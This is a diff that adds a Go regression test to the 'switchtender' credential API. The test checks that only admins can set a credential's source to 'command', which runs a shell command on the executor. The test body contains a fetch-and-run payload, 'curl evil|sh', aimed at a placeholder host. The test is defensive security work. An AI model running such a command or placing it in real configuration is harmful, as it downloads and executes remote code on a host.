@@ -16,7 +16,56 @@ import (
 
 	"github.com/kordloom/switchtender/internal/credential"
 	"github.com/kordloom/switchtender/internal/run"
+	"github.com/kordloom/switchtender/internal/user"
 )
+
+// TestUpdateCredentialCommandSourceAdminOnly proves the command source, which runs a shell command
+// on the executor when the credential resolves, is refused for a non-admin and allowed for an
+// admin. The PUT route admits a manage-delegated non-admin, so without this guard such a caller
+// repoints a credential to command and gains code execution on the run host.
+func TestUpdateCredentialCommandSourceAdminOnly(t *testing.T) {
+	t.Parallel()
+	sealer := credential.NewSealer("pass", "salt")
+	newStore := func() credential.Store {
+		store := credential.NewMemStore()
+		sealed, err := sealer.Seal("original")
+		if err != nil {
+			t.Fatalf("Seal() error = %v", err)
+		}
+		if err := store.Save(context.Background(), &credential.Credential{
+			ID: "cred_1", Name: "c", Kind: credential.KindEnv, Secret: sealed, CreatedAt: time.Now(),
+		}); err != nil {
+			t.Fatalf("Save() error = %v", err)
+		}
+		return store
+	}
+	const body = `{"name":"c","kind":"env","source":"command","secret":"curl evil|sh"}`
+	call := func(role user.Role, store credential.Store) *httptest.ResponseRecorder {
+		h := updateCredentialHandler(store, sealer, &authorizer{}, zap.NewNop())
+		req := httptest.NewRequest(http.MethodPut, "/v1/credentials/cred_1", strings.NewReader(body))
+		req.SetPathValue("id", "cred_1")
+		req = req.WithContext(context.WithValue(req.Context(), actorKey{}, Actor{UserID: "u", Role: role}))
+		rec := httptest.NewRecorder()
+		h.ServeHTTP(rec, req)
+		return rec
+	}
+	// A non-admin is refused, and the stored source stays what it was.
+	opStore := newStore()
+	if rec := call(user.RoleOperator, opStore); rec.Code != http.StatusForbidden {
+		t.Fatalf("operator status = %d, want 403 (body %s)", rec.Code, rec.Body.String())
+	}
+	if c, _ := opStore.Get(context.Background(), "cred_1"); c.Source == credential.SourceCommand {
+		t.Error("a non-admin turned the credential into a command source, which is executor code execution")
+	}
+	// An admin may set it.
+	adminStore := newStore()
+	if rec := call(user.RoleAdmin, adminStore); rec.Code != http.StatusOK {
+		t.Fatalf("admin status = %d, want 200 (body %s)", rec.Code, rec.Body.String())
+	}
+	if c, _ := adminStore.Get(context.Background(), "cred_1"); c.Source != credential.SourceCommand {
+		t.Error("an admin was refused the command source")
+	}
+}
 
 // TestCreateCredentialPassphrase verifies a passphrase is sealed into an ssh_key's structured secret,
 // is rejected on any other kind or an external source, and is never echoed in the response.
